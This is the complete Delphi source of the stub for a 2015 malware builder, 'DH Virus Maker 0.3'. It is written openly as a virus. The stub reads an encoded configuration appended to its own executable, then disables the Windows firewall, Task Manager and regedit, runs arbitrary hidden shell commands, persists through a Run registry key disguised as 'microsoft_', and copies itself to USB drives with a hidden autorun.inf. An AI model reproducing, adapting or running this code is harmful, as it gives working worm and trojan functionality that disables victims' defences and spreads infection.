// DH Virus Maker 0.3
// (C) Doddy Hackman 2015

program stub;

{$APPTYPE GUI}
{$R *.res}
{$POINTERMATH ON}

uses
  System.SysUtils, Registry, ShellApi, Windows, Winapi.Messages, Math;

var
  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  link: string;
  todo: string;

var
  op_disable_firewall, op_shutdown, op_reboot, op_close_session,
    op_change_text_taskbar, op_execute, op_disable_regedit, op_hide_taskbar,
    op_hide_icons, op_crazy_hour, op_start_windows, op_open_cd, op_sendkeys,
    op_kill_process, op_load_word, op_crazy_mouse, op_messagebox,
    op_disable_taskmgr, op_turn_off_monitor, op_play_beeps, op_usb_worm,
    op_usb_spread, op_change_time, op_startup: string;

var
  hide_file, directory: string;

var
  text_taskbar, command, sendkeys_text, process_pid, text_word,
    cantidad_mensaje, texto_mensaje, cantidad_beeps: string;

var
  directorio_final, nombrereal, yalisto: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;
end;

// Virus Functions

function leerdatos_sub(sub_1, sub_2, sub_3, sub_4: integer): DWORD;
begin
  Result := sub_1 shl 16 or sub_4 shl 14 or sub_2 shl 2 or sub_3;
end;

function opencd(tipoh: string): string;

// Credits : Based on http://stackoverflow.com/questions/19894566/using-windows-and-mmsystem-in-delphi
// Thanks to Sertac Akyuz

const
  const_uno = $00000009;
  const_dos = $0000002D;
  const_tres = 0;
  const_cuatro = 0;
  const_cinco = $0001;
  const_seis = const_dos;
  const_siete = 6;
  const_ocho = 8;

var
  var_uno: string;
  var_dos: THandle;
  var_tres: DWORD;
  opciondecd: integer;

begin

  if (tipoh = 'open') then
  begin
    opciondecd := $0202;
  end;

  if (tipoh = 'close') then
  begin
    opciondecd := $0203;
  end;

  var_uno := Format('\\.\%s:', ['D']);
  var_dos := CreateFile(Pchar(var_uno), GENERIC_READ, FILE_SHARE_WRITE, nil,
    OPEN_EXISTING, 0, 0);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_siete, const_tres,
    const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_ocho, const_tres,
    const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_seis, opciondecd, const_tres,
    const_cinco), nil, 0, nil, 0, var_tres, nil);
  CloseHandle(var_dos);

  Result := '[?] CD : OK';

end;

function crazy_mouse(number: string): string;
var
  i: integer;
  code: string;
begin
  code := '';
  For i := 1 to StrToInt(number) do
  begin
    sleep(1000);
    SetCursorPos(i, i);
  end;
  code := '[?] Crazy Mouse : OK';
  Result := code;
end;

function SendKeys(texto: string): string;
// Thanks to Remy Lebeau for the help
var
  eventos: PInput;
  controlb, controla: integer;
  code: string;
begin

  code := '';
  code := '[?] SendKeys : OK';

  GetMem(eventos, SizeOf(TInput) * (Length(texto) * 2));

  controla := 0;

  for controlb := 1 to Length(texto) do
  begin

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

  end;

  SendInput(controla, eventos[0], SizeOf(TInput));

  Result := code;

end;

function escribir_word(texto: string): string;
var
  code: string;
begin
  code := '';
  code := '[?] Word Joke : OK';
  ShellExecute(0, nil, Pchar('winword.exe'), nil, nil, SW_SHOWNORMAL);
  sleep(5000);
  SendKeys(texto);
  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[?] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[?] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[?] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[?] Show Icons : OK';
  end;
  Result := code;
end;

function matarproceso(pid: string): string;
var
  vano: THandle;
  code: string;

begin

  code := '';
  vano := OpenProcess(PROCESS_TERMINATE, FALSE, StrToInt(pid));

  if TerminateProcess(vano, 0) then
  begin
    code := '[?] Kill Process : OK';
  end
  else
  begin
    code := '[?] Kill Process : ERROR';
  end;

  Result := code;

end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, Pchar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    Pchar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function desactivar_firewall(os, opcion: string): string;
begin
  if (os = 'xp') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh firewall set opmode enable');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh firewall set opmode disable');
    end;
  end;
  if (os = 'seven') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh advfirewall set currentprofile state on');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh advfirewall set currentprofile state off');
    end;
  end;
  Result := '[+] Firewall Changed : OK';
end;

function apagar(): string;
begin
  ejecutar('shutdown -p');
  Result := '[+] Shutdown : OK';
end;

function cerrar_sesion(): string;
begin
  ejecutar('shutdown -l');
  Result := '[+] Close Session : OK';
end;

function reiniciar(): string;
begin
  ejecutar('shutdown -r');
  Result := '[+] Reboot : OK';
end;

function mensaje_box(texto: string; number: string): string;
var
  i: integer;
begin
  For i := 1 to StrToInt(number) do
  begin
    ejecutar('msg * ' + texto);
  end;
  Result := '[+] Message : OK';
end;

function regedit(opcion: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if (opcion = 'show') then
  begin
    make.WriteInteger('DisableRegistryTools', 0);
  end;
  if (opcion = 'hide') then
  begin
    make.WriteInteger('DisableRegistryTools', 1);
  end;
  make.Free;
  Result := '[+] Regedit Changed : OK';
end;

function edit_text_taskbar(opcion, texto: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Control Panel\International', True);
  if (opcion = 'enable') then
  begin
    make.WriteString('sShortTime', 'tt');
    make.WriteString('sTimeFormat', 'tt');
    make.WriteString('s1159', texto);
    make.WriteString('s2359', texto);
  end;
  if (opcion = 'disable') then
  begin
    make.WriteString('sShortTime', 'H:mm');
    make.WriteString('sTimeFormat', 'H:mm:ss');
    make.WriteString('s1159', '');
    make.WriteString('s2359', '');
  end;
  make.Free;
  Result := '[+] Taskbar Text : OK';
end;

function desactivar_tareas(opcion: string): string;
var
  admin: TRegistry;
begin
  admin := TRegistry.Create;
  admin.RootKey := HKEY_CURRENT_USER;
  admin.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if opcion = 'off' then
  begin
    admin.WriteString('DisableTaskMgr', '1');
  end
  else
  begin
    admin.DeleteValue('DisableTaskMgr');
  end;
  admin.CloseKey;
  Result := '[+] Taskmgr : OK';
end;

function apagar_monitor(): string;
const
  MONITOR_ON = -1;
  MONITOR_OFF = 2;
  MONITOR_STANDBY = 1;
begin
  SendMessage(GetForegroundWindow(), WM_SYSCOMMAND, SC_MONITORPOWER,
    MONITOR_OFF);
  Result := '[+] Turn Off Monitor : OK';
end;

function play_beep(cantidad: string): string;
var
  i: integer;
begin
  For i := 1 to StrToInt(cantidad) do
  begin
    Windows.Beep(800, 100);
  end;

  Result := '[+] Beep : OK';
end;

function cambiar_hora(cantidad: string): string;
var
  tiempo: TSystemTime;
  i: integer;
  nueva_hora: TDateTime;
  hora: integer;
  minutos: integer;
begin
  For i := 1 to StrToInt(cantidad) do
  begin
    hora := RandomRange(1, 23);
    minutos := RandomRange(1, 40);
    nueva_hora := StrToTime(IntToStr(hora) + ':' + IntToStr(minutos) + ':00');
    DateTimeToSystemTime(Date + nueva_hora, tiempo);
    SetLocalTime(tiempo);
    sleep(1000);
  end;
  Result := '[+] Crazy Hour : OK';
end;

function registry_start(option, path: string): string;
var
  registro: HKEY;
  admin: TRegistry;
begin
  if (option = 'on') then
  begin
    RegCreateKeyEx(HKEY_LOCAL_MACHINE,
      'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
      REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
    RegSetValueEx(registro, 'microsoft_', 0, REG_SZ, Pchar(path), 666);
    RegCloseKey(registro);
  end;
  if (option = 'off') then
  begin
    admin := TRegistry.Create;
    admin.RootKey := HKEY_LOCAL_MACHINE;
    admin.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run\', True);
    admin.DeleteValue('microsoft_');
    admin.CloseKey;
  end;

  Result := '[+] Startup : OK';
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Writeln(ar, texto);
  CloseFile(ar);

end;

function check_drive(target: string): Boolean;
var
  a, b, c: Cardinal;
begin
  Result := GetVolumeInformation(Pchar(target), nil, 0, @c, a, b, nil, 0);
end;

function usb_spread(opcion, path: string): string;
var
  unidad: Char;
  nombre: string;
begin

  if (opcion = 'on') then
  begin
    for unidad := 'C' to 'Z' do
    begin
      if (check_drive(Pchar(unidad + ':\')) = True) and
        (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        CopyFile(Pchar(path),
          Pchar(unidad + ':\' + ExtractFileName(path)), True);
        nombre := ExtractFileName(path);
        nombre := StringReplace(nombre, '/', '', [rfReplaceAll, rfIgnoreCase]);
        savefile(unidad + ':\' + 'autorun.inf', '[autorun]');
        savefile(unidad + ':\' + 'autorun.inf', 'open=' + nombre);
        SetFileAttributes(Pchar(unidad + ':\' + 'autorun.inf'),
          FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributes(Pchar(unidad + ':\' + ExtractFileName(path)),
          FILE_ATTRIBUTE_HIDDEN);

      end;
    end;
  end;

  if (opcion = 'off') then
  begin
    for unidad := 'C' to 'Z' do
    begin
      if (check_drive(Pchar(unidad + ':\')) = True) and
        (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        DeleteFile(Pchar(unidad + ':\' + 'autorun.inf'));
        DeleteFile(Pchar(unidad + ':\' + ExtractFileName(path)));
      end;
    end;
  end;

  Result := '[+] USB Spread : OK';

end;

begin
  try

    ob := INVALID_HANDLE_VALUE;
    code := '';

    ob := CreateFile(Pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0);
    if (ob <> INVALID_HANDLE_VALUE) then
    begin
      SetFilePointer(ob, -9999, nil, FILE_END);
      ReadFile(ob, code, 9999, nose, nil);
      CloseHandle(ob);
    end;

    todo := regex(code, '[63686175]', '[63686175]');
    todo := dhencode(todo, 'decode');

    if not(todo = '') then
    begin
      // Writeln('[+] Online');

      op_disable_firewall := regex(todo, '[disable_firewall]',
        '[disable_firewall]');
      op_shutdown := regex(todo, '[shutdown]', '[shutdown]');
      op_reboot := regex(todo, '[reboot]', '[reboot]');
      op_close_session := regex(todo, '[close_session]', '[close_session]');
      op_change_text_taskbar := regex(todo, '[change_text_taskbar]',
        '[change_text_taskbar]');
      op_execute := regex(todo, '[execute]', '[execute]');
      op_disable_regedit := regex(todo, '[disable_regedit]',
        '[disable_regedit]');
      op_hide_taskbar := regex(todo, '[hide_taskbar]', '[hide_taskbar]');
      op_hide_icons := regex(todo, '[hide_icons]', '[hide_icons]');
      op_crazy_hour := regex(todo, '[crazy_hour]', '[crazy_hour]');
      op_start_windows := regex(todo, '[start_windows]', '[start_windows]');
      op_open_cd := regex(todo, '[open_cd]', '[open_cd]');
      op_sendkeys := regex(todo, '[sendkeys]', '[sendkeys]');
      op_kill_process := regex(todo, '[kill_process]', '[kill_process]');
      op_load_word := regex(todo, '[load_word]', '[load_word]');
      op_crazy_mouse := regex(todo, '[crazy_mouse]', '[crazy_mouse]');
      op_messagebox := regex(todo, '[messagebox]', '[messagebox]');
      op_disable_taskmgr := regex(todo, '[disable_taskmgr]',
        '[disable_taskmgr]');
      op_turn_off_monitor := regex(todo, '[turn_off_monitor]',
        '[turn_off_monitor]');
      op_play_beeps := regex(todo, '[play_beeps]', '[play_beeps]');
      op_usb_spread := regex(todo, '[usb_spread]', '[usb_spread]');
      op_change_time := regex(todo, '[change_time]', '[change_time]');
      op_startup := regex(todo, '[startup]', '[startup]');
      text_taskbar := regex(todo, '[text_taskbar]', '[text_taskbar]');
      command := regex(todo, '[command]', '[command]');
      sendkeys_text := regex(todo, '[sendkeys_text]', '[sendkeys_text]');
      process_pid := regex(todo, '[process_pid]', '[process_pid]');
      text_word := regex(todo, '[text_word]', '[text_word]');
      cantidad_mensaje := regex(todo, '[cantidad_mensaje]',
        '[cantidad_mensaje]');
      texto_mensaje := regex(todo, '[texto_mensaje]', '[texto_mensaje]');
      cantidad_beeps := regex(todo, '[cantidad_beeps]', '[cantidad_beeps]');

      hide_file := regex(todo, '[hide_file]', '[hide_file]');
      directory := regex(todo, '[directory]', '[directory]');

      directorio_final := GetEnvironmentVariable(directory);
      nombrereal := ExtractFileName(paramstr(0));
      yalisto := directorio_final + '\' + nombrereal;
      MoveFile(Pchar(paramstr(0)), Pchar(yalisto));

      if (hide_file = '1') then
      begin
        SetFileAttributes(Pchar(yalisto), FILE_ATTRIBUTE_HIDDEN);
      end;

      // Writeln(todo);

      if (op_disable_firewall = '1') then
      begin
        // Writeln('[+] Firewall : OK');
        desactivar_firewall('seven', 'off');
      end;

      if (op_change_text_taskbar = '1') then
      begin
        // Writeln('[+] Text Taskbar : OK');
        edit_text_taskbar('enable', text_taskbar);
      end;

      if (op_execute = '1') then
      begin
        // Writeln('[+] Execute : OK');
        ejecutar(command);
      end;

      if (op_disable_regedit = '1') then
      begin
        // Writeln('[+] Regedit : OK');
        regedit('hide');
      end;

      if (op_hide_taskbar = '1') then
      begin
        // Writeln('[+] Hide Taskbar : OK');
        cambiar_barra('hide');
      end;

      if (op_hide_icons = '1') then
      begin
        // Writeln('[+] Hide Icons : OK');
        cambiar_iconos('hide');
      end;

      if (op_open_cd = '1') then
      begin
        // Writeln('[+] Open CD : OK');
        opencd('open');
      end;

      if (op_sendkeys = '1') then
      begin
        // Writeln('[+] Sendkeys : OK');
        SendKeys(sendkeys_text);
      end;

      if (op_load_word = '1') then
      begin
        // Writeln('[+] Load Word : OK');
        escribir_word(text_word);
      end;

      if (op_crazy_mouse = '1') then
      begin
        // Writeln('[+] Crazy Mouse : OK');
        crazy_mouse('60');
      end;

      if (op_kill_process = '1') then
      begin
        // Writeln('[+] Kill Process : OK');
        matarproceso(process_pid);
      end;

      if (op_messagebox = '1') then
      begin
        // Writeln('[+] MessageBox : OK');
        mensaje_box(texto_mensaje, cantidad_mensaje);
      end;

      if (op_disable_taskmgr = '1') then
      begin
        // Writeln('[+] Disable Taskmgr : OK');
        desactivar_tareas('on');
      end;

      if (op_play_beeps = '1') then
      begin
        // Writeln('[+] Beep : OK');
        play_beep(cantidad_beeps);
      end;

      if (op_change_time = '1') then
      begin
        // Writeln('[+] Change Time : OK');
        cambiar_hora('60');
      end;

      if (op_usb_spread = '1') then
      begin
        // Writeln('[+] Usb Spread : OK');
        usb_spread('on', yalisto);
      end;

      if (op_startup = '1') then
      begin
        // Writeln('[+] Startup : OK');
        registry_start('on', yalisto);
      end;

      if (op_turn_off_monitor = '1') then
      begin
        // Writeln('[+] Turn off monitor : OK');
        apagar_monitor();
      end;

      if (op_shutdown = '1') then
      begin
        // Writeln('[+] Shutdown : OK');
        apagar();
      end;

      if (op_reboot = '1') then
      begin
        // Writeln('[+] Reboot : OK');
        reiniciar();
      end;

      if (op_close_session = '1') then
      begin
        // Writeln('[+] Close session : OK');
        cerrar_sesion();
      end;

    end
    else
    begin
      // Writeln('[-] Offline');
    end;

  except
    on E: Exception do
      // Writeln(E.ClassName, ': ', E.Message);
  end;

end.

// The End ?
